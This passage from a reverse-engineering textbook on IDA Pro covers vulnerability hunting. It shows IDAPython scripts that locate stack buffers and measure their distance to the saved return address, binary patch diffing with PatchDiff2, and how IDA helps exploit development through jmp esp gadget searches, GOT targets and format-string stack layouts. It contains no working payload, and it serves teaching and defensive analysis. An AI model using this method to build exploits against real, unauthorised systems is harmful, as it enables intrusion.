valign="bottom"><p>Severity</p></th><th style="text-align: left" valign="bottom"><p>Description</p></th></tr></thead><tbody><tr><td style="text-align: left" valign="top"><p>8048c03</p></td><td style="text-align: left" valign="top"><p>5</p></td><td style="text-align: left" valign="top"><p>The maximum expansion of the data appears to be larger than the target buffer; this might be the cause of a buffer overrun! Maximum Expansion: 1053. Target Size: 1036.</p></td></tr></tbody></table></div><p>In this case, BugScam was able to determine the size of the input and output buffers, which, when combined with the format specifiers contained in the format string, were used to determine the maximum size of the generated output.</p><p>Developing scripts of this nature requires an in-depth understanding of various exploit classes in order to develop an algorithm that can be applied generically across a large body of binaries. Lacking such knowledge, we can still develop scripts (or plug-ins) that answer simple questions for us faster than we can find the answers manually.</p><p>As a final example, consider the task of locating all functions that contain stack-allocated buffers, since these are the functions that might be susceptible to stack-based buffer-overflow attacks. Rather than manually scrolling through a database, we can develop a script to analyze the stack frame of each function, looking for variables that occupy large amounts of space. The Python function in <a class="xref" href="ch22.html#scanning_for_stack-allocated_buffers" title="Example 22-3. Scanning for stack-allocated buffers">Example 22-3</a> iterates through the defined members of a given function’s stack frame in search of variables whose size is larger than a specified minimum size.<a class="indexterm" id="IDX-CHP-22-0024"/></p><div class="example"><a id="scanning_for_stack-allocated_buffers"/><p class="title">Example 22-3. Scanning for stack-allocated buffers</p><div class="example-contents"><pre class="programlisting">def findStackBuffers(func_addr, minsize):
     prev_idx = −1
     frame = GetFrame(func_addr)
     if frame == −1: return   #bad function
       idx = 0
     prev = None
     while idx &lt; GetStrucSize(frame):
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>       member = GetMemberName(frame, idx)
        if member is not None:
           if prev_idx != −1:
              #compute distance from previous field to current field
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>             delta = idx - prev_idx
<img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/>             if delta &gt;= minsize:
                 Message("%s: possible buffer %s: %d bytes\n" %  \
                         (GetFunctionName(func_addr), prev, delta))
           prev_idx = idx
           prev = member
<img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/>          idx = idx + GetMemberSize(frame, idx)
        else:
<img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/>          idx = idx + 1</pre></div></div><p>This function locates all the variables in a stack frame using repeated calls to <code class="literal">GetMemberName</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e38959"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> for all valid offsets within the stack frame. The size of a variable is computed as the difference between the starting offsets of two successive variables <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e38965"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>. If the size exceeds a threshold size (<code class="literal">minsize</code>) <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e38974"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span>, then the variable is reported as a possible stack buffer. The index into the structure is moved along by either 1 byte <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e38981"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span> when no member is defined at the current offset or by the size of any member found at the current offset <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e38987"/><img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/></span>. The <code class="literal">GetMem-berSize</code> function may seem like a more suitable choice for computing the size of each stack variable; however, this is true only if the variable has been sized properly by either IDA or the user. Consider the following stack frame:<a class="indexterm" id="IDX-CHP-22-0025"/><a class="indexterm" id="IDX-CHP-22-0026"/></p><a id="I_programlisting3_d1e39003"/><pre class="programlisting">.text:08048B38 sub_8048B38     proc near
.text:08048B38
.text:08048B38 var_818         = byte ptr −818h
.text:08048B38 var_418         = byte ptr −418h
.text:08048B38 var_C           = dword ptr −0Ch
.text:08048B38 arg_0           = dword ptr  8</pre><p>Using the displayed byte offsets, we can compute that there are 1,024 bytes from the start of <code class="literal">var_818</code> to the start of <code class="literal">var_418</code> (<code class="literal">818h - 418h = 400h</code>) and 1,036 bytes between the start of <code class="literal">var_418</code> and the start of <code class="literal">var_C</code> (<code class="literal">418h - 0Ch</code>). However, the stack frame might be expanded to show the following layout:</p><a id="I_programlisting3_d1e39026"/><pre class="programlisting">-00000818 var_818         db ?
−00000817                 db ? ; undefined
−00000816                 db ? ; undefined
...
−0000041A                 db ? ; undefined
−00000419                 db ? ; undefined
−00000418 var_418         db 1036 dup(?)
−0000000C var_C           dd ?</pre><p>Here, <code class="literal">var_418</code> has been collapsed into an array, while <code class="literal">var_818</code> appears to be only a single byte (with 1,023 undefined bytes filling the space between <code class="literal">var_818</code> and <code class="literal">var_418</code>). For this stack layout, <code class="literal">GetMemberSize</code> will report 1 byte for <code class="literal">var_818</code> and 1,036 bytes for <code class="literal">var_418</code>, which is an undesirable result. The output of a call to <code class="literal">findStackBuffers(0x08048B38, 16)</code> results in the following output, regardless of whether <code class="literal">var_818</code> is defined as a single byte or an array of 1,024 bytes:<a class="indexterm" id="IDX-CHP-22-0027"/><a class="indexterm" id="IDX-CHP-22-0028"/><a class="indexterm" id="IDX-CHP-22-0029"/><a class="indexterm" id="IDX-CHP-22-0030"/><a class="indexterm" id="IDX-CHP-22-0031"/><a class="indexterm" id="IDX-CHP-22-0032"/><a class="indexterm" id="IDX-CHP-22-0033"/><a class="indexterm" id="IDX-CHP-22-0034"/></p><a id="I_programlisting3_d1e39085"/><pre class="programlisting">sub_8048B38: possible buffer var_818: 1024 bytes
sub_8048B38: possible buffer var_418: 1036 bytes</pre><p>Creating a <code class="literal">main</code> function that iterates through all functions in a database (see <a class="xref" href="ch15.html" title="Chapter 15. IDA Scripting">Chapter 15</a>) and calls <code class="literal">findStackBuffers</code> for each function yields a script that quickly points out the use of stack buffers within a program. Of course, determining whether any of those buffers can be overflowed requires additional (usually manual) study of each function. The tedious nature of static analysis is precisely the reason that fuzz testing is so popular.</p></div><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-22-FN-1" id="ftn.CHP-22-FN-1">186</a>] </sup>In general, far more vulnerabilities are discovered through fuzz testing than through static analysis.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-22-FN-2" id="ftn.CHP-22-FN-2">187</a>] </sup>For example, see Jon Erickson’s <span class="emphasis"><em>Hacking: The Art of Exploitation, 2nd Edition</em></span> (<a class="ulink" href="http://nostarch.com/hacking2.htm">http://nostarch.com/hacking2.htm</a>).</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-22-FN-3" id="ftn.CHP-22-FN-3">188</a>] </sup>See <a class="ulink" href="http://www.veracode.com/">http://www.veracode.com/</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-22-FN-4" id="ftn.CHP-22-FN-4">189</a>] </sup>See <a class="ulink" href="http://www.sourceforge.net/projects/bugscam/">http://www.sourceforge.net/projects/bugscam/</a>.</p></div></div></div>
<div class="sect1" title="After-the-Fact Vulnerability Discovery with IDA"><div class="titlepage"><div><div><h1 class="title"><a id="after-the-fact_vulnerability_discovery_w"/>After-the-Fact Vulnerability Discovery with IDA</h1></div></div></div><p>A perpetual debate rages over the exact process by which software vulnerabilities should be disclosed. For any vulnerability discovered in a piece of software, we can assign the roles of discoverer (of the vulnerability) and maintainer (of the software). In addition, we can specify a number of events, which may or may not take place, surrounding the discovery of any vulnerability. Some of these events are briefly described here. Please keep in mind that the entire vulnerability-disclosure process is hotly debated, and the following terms are by no means standardized or even widely accepted.</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Discovery</strong></span></span></dt><dd><p>The time at which a vulnerability is initially discovered. For our purposes, we will also consider this to be the time at which an exploit for that vulnerability is initially developed.</p></dd><dt><span class="term"><span class="strong"><strong>Notification</strong></span></span></dt><dd><p>The time at which the software maintainer is initially made aware of the vulnerability within its product. This may coincide with discovery if the vendor happens to find the vulnerability itself.</p></dd><dt><span class="term"><span class="strong"><strong>Disclosure</strong></span></span></dt><dd><p>The time at which a vulnerability is made known to the public. This event can be muddied by the level of detail made available regarding the vulnerability. Disclosure may or may not be accompanied by the release or identification of working exploits. In some cases disclosure also serves as notification to the vendor.</p></dd><dt><span class="term"><span class="strong"><strong>Mitigation</strong></span></span></dt><dd><p>The time at which steps are published that, if followed, may prevent a user from falling victim to an existing exploit. Mitigation steps are work-around solutions for users awaiting the publication of a patch.</p></dd><dt><span class="term"><span class="strong"><strong>Patch availability</strong></span></span></dt><dd><p>The time at which the maintainer (or a third party) makes available a corrected version of the vulnerable software.<a class="indexterm" id="IDX-CHP-22-0035"/><a class="indexterm" id="IDX-CHP-22-0036"/><a class="indexterm" id="IDX-CHP-22-0037"/></p></dd><dt><span class="term"><span class="strong"><strong>Patch application</strong></span></span></dt><dd><p>The time at which users actually install the updated, corrected software, rendering themselves immune (hopefully) to all known attacks that rely on the presence of the given vulnerability.</p></dd></dl></div><p>A wealth of papers are more than happy to tell you all about windows of vulnerability, obligations on the part of the discoverer and the maintainer, and exactly how much information should be disclosed and when that disclosure should take place. Getting to the point, it is common for disclosure to coincide with the availability of a patch.</p><p>In most cases, a vulnerability advisory is published in conjunction with the patch. The vulnerability advisory provides some level of technical detail describing the nature and severity of the problem that has been patched, but the level of detail is usually insufficient to use in developing a working exploit for the problem. Why anyone would want to develop a working exploit is another matter. Clearly some people are interested in exploiting computers that remain unpatched, and the faster an exploit can be developed, the greater their chance of exploiting more computers. In other cases, vendors may be interested in developing tools that scan for the presence of unpatched systems on networks or in developing techniques for real-time detection of exploitation attempts. In most cases, development of such tools requires a detailed understanding of the exact nature of the newly patched vulnerability.<a class="indexterm" id="IDX-CHP-22-0038"/></p><p>Advisories may lack such essential information as the exact file or files that contain the vulnerability, the name or location of any vulnerable functions, and exactly what was changed within those functions. The patched files themselves, however, contain all the information that an exploit developer requires in order to develop a working exploit for the newly patched vulnerability. This information is not immediately obvious, nor is it clearly intended for the consumption of an exploit developer. Instead, this information is present in the form of the changes that were made in order to eliminate the underlying vulnerability. The easiest way to highlight such changes is to compare a patched binary against its unpatched counterpart. If we have the luxury of looking for differences in patched source files, then standard text-oriented comparison utilities such as <code class="literal">diff</code> can make short work of pinpointing changes. Unfortunately, tracking down behavioral changes between two revisions of a binary file is far more complicated than simple text file diffing.<a class="indexterm" id="IDX-CHP-22-0039"/></p><p>The difficulty with using difference computation to isolate the changes in two binaries lies in the fact that binaries can change for several reasons. Changes may be triggered by compiler optimizations, changes to the compiler itself, reorganization of source code, addition of code unrelated to the vulnerability, and of course the code that patches the vulnerability itself. The challenge lies in isolating behavioral changes (such as those required to fix the vulnerability) from cosmetic changes (such as the use of different registers to accomplish the same task).</p><p>A number of tools designed specifically for binary diffing are available, including the commercial BinDiff from Zynamics;<sup>[<a class="footnote" href="#ftn.CHP-22-FN-5" id="CHP-22-FN-5">190</a>]</sup> the free Binary Diffing Suite (BDS) from eEye Digital Security;<sup>[<a class="footnote" href="#ftn.CHP-22-FN-6" id="CHP-22-FN-6">191</a>]</sup> Turbodiff,<sup>[<a class="footnote" href="#ftn.CHP-22-FN-7" id="CHP-22-FN-7">192</a>]</sup> also free and available from Core Labs (part of Core Security, makers of Core Impact<sup>[<a class="footnote" href="#ftn.CHP-22-FN-8" id="CHP-22-FN-8">193</a>]</sup>); and PatchDiff2<sup>[<a class="footnote" href="#ftn.CHP-22-FN-9" id="CHP-22-FN-9">194</a>]</sup> by Nicolas Pouvesle. Each of these tools relies on supplied IDA in one way or another. BinDiff and BDS make use of IDA scripts and plug-ins to perform initial analysis tasks on both the patched and the unpatched versions of the binaries being analyzed. Information extracted by the plug-ins is stored in a backend database, and each tool provides a graph-based display and can navigate through the differences detected during the analysis phase. Turbodiff and PatchDiff2 are implemented as IDA plug-ins and display their results within IDA itself. The ultimate goal of these tools is to quickly highlight the changes made to patch a vulnerability in order to understand why the code was vulnerable in the first place. Additional information on each tool is available on its respective website.<a class="indexterm" id="IDX-CHP-22-0040"/><a class="indexterm" id="IDX-CHP-22-0041"/><a class="indexterm" id="IDX-CHP-22-0042"/><a class="indexterm" id="IDX-CHP-22-0043"/><a class="indexterm" id="IDX-CHP-22-0044"/><a class="indexterm" id="IDX-CHP-22-0045"/><a class="indexterm" id="IDX-CHP-22-0046"/></p><p>Representative of the free diffing tools, PatchDiff2 is an open source project offering compiled, 32- and 64-bit Windows versions of the plug-in along with subversion access to the plug-in source. Installing the plug-in involves copying the plug-in binaries into <span class="emphasis"><em>&lt;IDADIR&gt;/plugins</em></span>.</p><p>The first step in using PatchDiff2 is to create two separate IDA databases, one for each of the two binaries to be compared. Typically one of these databases would be created for the original version of the binary, while the other database would be created for the patched version of the binary.</p><div class="informaltable"><table style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/></colgroup><tbody><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Name</strong></span></p></td><td style="text-align: left" valign="top"><p>PatchDiff2</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Author</strong></span></p></td><td style="text-align: left" valign="top"><p>Nicolas Pouvesle</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Distribution</strong></span></p></td><td style="text-align: left" valign="top"><p>Source and binaries for IDA 5.7</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Price</strong></span></p></td><td style="text-align: left" valign="top"><p>Free</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Description</strong></span></p></td><td style="text-align: left" valign="top"><p>Binary difference generation and display</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Information</strong></span></p></td><td style="text-align: left" valign="top"><p><a class="ulink" href="http://code.google.com/p/patchdiff2/">http://code.google.com/p/patchdiff2/</a></p></td></tr></tbody></table></div><p>Invoking the plug-in typically involves opening the database for the original binary and then activating PatchDiff2 via the Edit ▸ Plugins menu or its associated hot key (default is <span class="keycap">ctrl</span>-8). PatchDiff2 refers to the database from which you invoke the plug-in as <span class="emphasis"><em>IDB1</em></span>, or the “first idb.” Upon activation, PatchDiff2 will ask to open the second database against which the currently open database will be compared; this database is known as <span class="emphasis"><em>IDB2</em></span>, or the “second idb.” Once a second database has been selected, PatchDiff2 computes a number of identifying features for every function in each database including various types of signatures, hash values, and CRC values. Utilizing these features, PatchDiff2 creates three lists of functions titled <span class="emphasis"><em>Identical Functions</em></span>, <span class="emphasis"><em>Unmatched Functions</em></span>, and <span class="emphasis"><em>Matched Functions</em></span>. Each of these lists is displayed in a new tabbed window opened by PatchDiff2.<a class="indexterm" id="IDX-CHP-22-0047"/><a class="indexterm" id="IDX-CHP-22-0048"/><a class="indexterm" id="IDX-CHP-22-0049"/><a class="indexterm" id="IDX-CHP-22-0050"/><a class="indexterm" id="IDX-CHP-22-0051"/><a class="indexterm" id="IDX-CHP-22-0052"/><a class="indexterm" id="IDX-CHP-22-0053"/><a class="indexterm" id="IDX-CHP-22-0054"/><a class="indexterm" id="IDX-CHP-22-0055"/></p><p>The Identical Functions list contains the list of functions that PatchDiff2 deems to be identical in both databases. From an analysis point of view, these functions are likely to be uninteresting because they contribute nothing to the changes that produced the patched version of the binary.<a class="indexterm" id="IDX-CHP-22-0056"/></p><p>The Unmatched Functions list shows functions from both databases that do not appear to be similar to one another according to the metrics applied by PatchDiff2. In practice, these functions have either been added to the patched version, removed from the unpatched version, or are too similar to other functions within the same binary to be able to distinguish them from corresponding functions in the second binary. With careful manual analysis it is often possible to match pairs of functions within the Unmatched Functions list. As a general rule of thumb, it is a good idea to manually compare the structure of functions that have similar numbers of signatures. To facilitate this, it is best to sort the list based on the <span class="emphasis"><em>sig</em></span> column so that functions with similar numbers of signatures are listed near one another. The first few lines of an unmatched functions list sorted on <span class="emphasis"><em>sig</em></span> are shown here.</p><a id="I_programlisting3_d1e39361"/><pre class="programlisting">File Function name Function address Sig      Hash     CRC
---- ------------- ---------------- ---      ----     ---
1    sub_7CB25FE9  7CB25FE9         000000F0 F4E7267B 411C3DCC
1    sub_7CB6814C  7CB6814C         000000F0 F4E7267B 411C3DCC
2    sub_7CB6819A  7CB6819A         000000F0 F4E7267B 411C3DCC
2    sub_7CB2706A  7CB2706A         000000F0 F4E7267B 411C3DCC</pre><p>It is clear that the two functions from file one are related to the two functions from file two; however, PatchDiff2 is unable to determine how to pair them up. It is not uncommon to see multiple functions with identical structures in binaries that make use of the C++ <span class="emphasis"><em>standard template library (STL)</em></span>. If you are able to manually match a function from one file to its corresponding function in the other file, you may use PatchDiff2’s <span class="emphasis"><em>Set Match</em></span> feature (available on the context-sensitive menu) to choose one function in the list and match it to a second function in the list. <a class="xref" href="ch22s02.html#manually_matching_functions_with_patchdi" title="Figure 22-1. Manually matching functions with PatchDiff2">Figure 22-1</a> shows the Set Match dialog.<a class="indexterm" id="IDX-CHP-22-0057"/><a class="indexterm" id="IDX-CHP-22-0058"/><a class="indexterm" id="IDX-CHP-22-0059"/></p><div class="figure"><a id="manually_matching_functions_with_patchdi"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject3_d1e39387"/><img alt="Manually matching functions with PatchDiff2" src="httpatomoreillycomsourcenostarchimages854338.png.jpg"/></div></div><p class="title">Figure 22-1. Manually matching functions with PatchDiff2</p></div><p>Manual matching begins when you choose one function using the Set Match menu option. In the resulting dialog, you must enter the address of the matching function in the file you are not viewing. The Propagate option asks PatchDiff2 to match as many additional functions as it can, given that you have informed it of a new match.<a class="indexterm" id="IDX-CHP-22-0060"/><a class="indexterm" id="IDX-CHP-22-0061"/><a class="indexterm" id="IDX-CHP-22-0062"/><a class="indexterm" id="IDX-CHP-22-0063"/><a class="indexterm" id="IDX-CHP-22-0064"/></p><p>The Matched Functions list contains the list of functions that PatchDiff2 deems sufficiently similar, yet not quite identical, according to the metrics applied by in the matching process. Right-clicking any entry in this list and selecting Display Graphs causes PatchDiff2 to display flow graphs for the two matched functions. One such pair of graphs is shown in <a class="xref" href="ch22s02.html#patchdiff2_graphical_function_comparison" title="Figure 22-2. PatchDiff2 graphical function comparison">Figure 22-2</a>. PatchDiff2 makes use of color coding to highlight blocks that have been introduced into the patched version of the binary, making it easy to focus on the changed portions of the code.</p><div class="figure"><a id="patchdiff2_graphical_function_comparison"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject3_d1e39420"/><img alt="PatchDiff2 graphical function comparison" src="httpatomoreillycomsourcenostarchimages854341.png.jpg"/></div></div><p class="title">Figure 22-2. PatchDiff2 graphical function comparison</p></div><p>In these graphs, blocks <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e39427"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> through <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e39433"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span> are present in both functions, while block <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e39439"/><img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/></span> has been added in the patched version of the function. During differential analysis, matched functions may be of the highest interest initially because they are likely to contain the changes that have been incorporated into the patched binary that address vulnerabilities discovered in the original binary. Close study of these changes may reveal the corrections that have been made or safety checks that have been added in order to address incorrect behavior or exploitable conditions. If we fail to find any interesting changes highlighted in the Matched Functions list, then the Unmatched Functions list is our only other option for attempting to locate the patched code.</p><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-22-FN-5" id="ftn.CHP-22-FN-5">190</a>] </sup>See <a class="ulink" href="http://www.zynamics.com/bindiff.html">http://www.zynamics.com/bindiff.html</a>. Note that in March 2011, Zynamics was acquired by Google.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-22-FN-6" id="ftn.CHP-22-FN-6">191</a>] </sup>See <a class="ulink" href="http://research.eeye.com/html/tools/RT20060801-1.html">http://research.eeye.com/html/tools/RT20060801-1.html</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-22-FN-7" id="ftn.CHP-22-FN-7">192</a>] </sup>See <a class="ulink" href="http://corelabs.coresecurity.com/index.php?module=Wiki&amp;action=view&amp;type=tool&amp;name=turbodiff">http://corelabs.coresecurity.com/index.php?module=Wiki&amp;action=view&amp;type=tool&amp;name=turbodiff</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-22-FN-8" id="ftn.CHP-22-FN-8">193</a>] </sup>See <a class="ulink" href="http://www.coresecurity.com/content/core-impact-overview/">http://www.coresecurity.com/content/core-impact-overview/</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-22-FN-9" id="ftn.CHP-22-FN-9">194</a>] </sup>See <a class="ulink" href="http://code.google.com/p/patchdiff2">http://code.google.com/p/patchdiff2</a>. Note also that Alexander Pick has ported PatchDiff2 to IDA 6.0 for OS X. For more information please see <a class="ulink" href="https://github.com/alexander-pick/patchdiff2_ida6">https://github.com/alexander-pick/patchdiff2_ida6</a>.</p></div></div></div>
<div class="sect1" title="IDA and the Exploit-Development Process"><div class="titlepage"><div><div><h1 class="title"><a id="ida_and_the_exploit-development_process"/>IDA and the Exploit-Development Process</h1></div></div></div><p>Assuming that you manage to locate a potentially exploitable vulnerability, how can IDA help with the exploit-development process? The answer to this question requires that you understand what type of help you need in order for you to make use of the appropriate features of IDA.<a class="indexterm" id="IDX-CHP-22-0065"/><a class="indexterm" id="IDX-CHP-22-0066"/><a class="indexterm" id="IDX-CHP-22-0067"/><a class="indexterm" id="IDX-CHP-22-0068"/><a class="indexterm" id="IDX-CHP-22-0069"/><a class="indexterm" id="IDX-CHP-22-0070"/></p><p>IDA is very good at several things that can save you a tremendous amount of trial and error when developing exploits:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>IDA graphs can be useful in determining control flow paths as a means of understanding how a vulnerable function may be reached. Careful selection of graph-generation parameters may be required in large binaries in order to minimize the complexity of generated graphs. Refer to <a class="xref" href="ch09.html" title="Chapter 9. Cross-References and Graphing">Chapter 9</a> for more information on IDA graphs.</p></li><li class="listitem"><p>IDA breaks down stack frames to a great level of detail. If you are overwriting information in the stack, IDA will help you understand exactly what is getting overwritten by which portions of your buffer. IDA stack displays are also invaluable in determining the memory layout of format string buffers.</p></li><li class="listitem"><p>IDA has excellent search facilities. If you need to search for a specific instruction (such as <code class="literal">jmp esp</code>) or sequence of instructions (such as <code class="literal">pop/pop/</code><code class="literal">ret</code>) within a binary, IDA can rapidly tell you whether the instruction(s) is present in the binary and, if so, the exact virtual address at which the instruction(s) is located.</p></li><li class="listitem"><p>The fact that IDA maps binaries as if they are loaded in memory makes it easier for you to locate virtual addresses that you may require in order to land your exploit. IDA’s disassembly listings make it simple to determine the virtual address of any globally allocated buffers as well as useful addresses (such as <code class="literal">GOT</code> entries) to target when you have a write4<sup>[<a class="footnote" href="#ftn.CHP-22-FN-10" id="CHP-22-FN-10">195</a>]</sup> capability.</p></li></ul></div><p>We will discuss several of these capabilities and how you can leverage them in the following sections.</p><div class="sect2" title="Stack Frame Breakdown"><div class="titlepage"><div><div><h2 class="title"><a id="stack_frame_breakdown"/>Stack Frame Breakdown</h2></div></div></div><p>While stack-protection mechanisms are rapidly becoming standard features in modern operating systems, many computers continue to run operating systems that allow code to be executed in the stack, as is done in a plain-vanilla stack-based buffer-overflow attack. Even when stack protections are in place, overflows may be used to corrupt stack-based pointer variables, which can be further leveraged to complete an attack.</p><p>Regardless of what you intend to do when you discover a stack-based buffer overflow, it is vital to understand exactly what stack content will be overwritten as your data overflows the vulnerable stack buffer. You will probably also be interested in knowing exactly how many bytes you need to write into the buffer until you can control various variables within the function’s stack frame, including the function’s saved return address. IDA’s default stack frame displays can answer all of these questions if you are willing to do a little math. The distance between any two variables in the stack can be computed by subtracting the stack offsets of the two variables. The following stack frame includes a buffer that can be overflowed when input to the corresponding function is carefully controlled:</p><a id="I_programlisting3_d1e39520"/><pre class="programlisting">−0000009C result          dd ?
−00000098 buffer_132      db 132 dup(?)           ; this can be overflowed
−00000014 p_buf           dd ?                    ; pointer into buffer_132
−00000010 num_bytes       dd ?                    ; bytes read per loop
−0000000C total_read      dd ?                    ; total bytes read
−00000008                 db ? ; undefined
−00000007                 db ? ; undefined
−00000006                 db ? ; undefined
−00000005                 db ? ; undefined
−00000004                 db ? ; undefined
−00000003                 db ? ; undefined
−00000002                 db ? ; undefined
−00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)             ; save return address
+00000008 filedes         dd ?                    ; socket descriptor</pre><p>The distance from the beginning of the vulnerable buffer (<code class="literal">buffer_132</code>) to the saved return address is 156 bytes (<code class="literal">4 - −98h</code>, or <code class="literal">4 - −152</code>). You can also see that after 132 bytes (<code class="literal">−14h - −98h</code>), the contents of <code class="literal">p_buf</code> will start to get overwritten, which may or may not cause problems. You must clearly understand the effect of overwriting variables that lie beyond the end of the buffer in order to prevent the target application from crashing before the exploit can be triggered. In this example, <code class="literal">filedes</code> (a socket descriptor) might be another problematic variable. If the vulnerable function expects to use the socket descriptor after you have finished overflowing the buffer, then you need to take care that any overwriting of <code class="literal">filedes</code> will not cause the function to error out unexpectedly. One strategy for dealing with variables that will be overwritten is to write values into these variables that make sense to the program so that the program continues to function normally until your exploit is triggered.<a class="indexterm" id="IDX-CHP-22-0071"/></p><p>For a slightly more readable breakdown of a stack frame, we can modify the stack buffer–scanning code from <a class="xref" href="ch22.html#scanning_for_stack-allocated_buffers" title="Example 22-3. Scanning for stack-allocated buffers">Example 22-3</a> to enumerate all members of a stack frame, compute their apparent size, and display the distance from each member to the saved return address. <a class="xref" href="ch22s03.html#enumerating_a_single_stack_frame_using_p" title="Example 22-4. Enumerating a single stack frame using Python">Example 22-4</a> shows the resulting script.</p><div class="example"><a id="enumerating_a_single_stack_frame_using_p"/><p class="title">Example 22-4. Enumerating a single stack frame using Python</p><div class="example-contents"><pre class="programlisting">func = ScreenEA()  #process function at cursor location
  frame = GetFrame(func)
  if frame != −1:
     Message("Enumerating stack for %s\n" % GetFunctionName(func))
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>    eip_loc = GetFrameLvarSize(func) + GetFrameRegsSize(func)
       prev_idx = −1
     idx = 0
     while idx &lt; GetStrucSize(frame):
        member = GetMemberName(frame, idx)
        if member is not None:
           if prev_idx != −1:
              #compute distance from previous field to current field
              delta = idx - prev_idx
              Message("%15s: %4d bytes (%4d bytes to eip)\n" % \
                      (prev, delta, eip_loc - prev_idx))
           prev_idx = idx
           prev = member
           idx = idx + GetMemberSize(frame, idx)
        else:
           idx = idx + 1
     if prev_idx != −1:
        #make sure we print the last field in the frame
        delta = GetStrucSize(frame) - prev_idx
        Message("%15s: %4d bytes (%4d bytes to eip)\n" % \
                (prev, delta, eip_loc - prev_idx))</pre></div></div><p>This script introduces the <code class="literal">GetFrameLvarSize</code> and <code class="literal">GetFrameRegsSize</code> functions (also available in IDC). These functions are used to retrieve the size of a stack frame’s local variable and saved register areas, respectively. The saved return address lies directly beneath these two areas, and the offset to the saved return address is computed as the sum of these two values <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e39574"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span>. When executed against our example function, the script produces the following output:<a class="indexterm" id="IDX-CHP-22-0072"/><a class="indexterm" id="IDX-CHP-22-0073"/><a class="indexterm" id="IDX-CHP-22-0074"/><a class="indexterm" id="IDX-CHP-22-0075"/></p><a id="I_programlisting3_d1e39594"/><pre class="programlisting">Enumerating stack for handleSocket
         result:    4 bytes ( 160 bytes to eip)
     buffer_132:  132 bytes ( 156 bytes to eip)
          p_buf:    4 bytes (  24 bytes to eip)
      num_bytes:    4 bytes (  20 bytes to eip)
     total_read:   12 bytes (  16 bytes to eip)
              s:    4 bytes (   4 bytes to eip)
              r:    4 bytes (   0 bytes to eip)
         fildes:    4 bytes (  −4 bytes to eip)</pre><p>The results offer a concise summary of a function’s stack frame annotated with additional information of potential use to an exploit developer.</p><p>IDA’s stack frame displays also prove useful when developing exploits for format string vulnerabilities. As an example, consider the following short code fragment in which the <code class="literal">fprintf</code> function is invoked with a user-supplied buffer provided as the format string.</p><a id="I_programlisting3_d1e39604"/><pre class="programlisting">.text:080488CA        lea     eax, [ebp+format]
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>  .text:080488D0        mov     [esp+4], eax    ; format
   .text:080488D4        mov     eax, [ebp+stream]
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>  .text:080488DA        mov     [esp], eax      ; stream
   .text:080488DD        call    _fprintf</pre><p>In this example, only two arguments are passed to <code class="literal">fprintf</code>, a file pointer <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e39623"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> and the address of the user’s buffer as a format string <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e39629"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>. These arguments occupy the top two positions on the stack, memory that has already been allocated by the calling function as part of the function’s prologue. The stack frame for the vulnerable function is shown in <a class="xref" href="ch22s03.html#stack_frame_for_format_string_example" title="Example 22-5. Stack frame for format string example">Example 22-5</a>.<a class="indexterm" id="IDX-CHP-22-0076"/></p><div class="example"><a id="stack_frame_for_format_string_example"/><p class="title">Example 22-5. Stack frame for format string example</p><div class="example-contents"><pre class="programlisting"><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>  −00000128                 db ? ; undefined
   −00000127                 db ? ; undefined
   −00000126                 db ? ; undefined
   −00000125                 db ? ; undefined
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>  −00000124                 db ? ; undefined
   −00000123                 db ? ; undefined
   −00000122                 db ? ; undefined
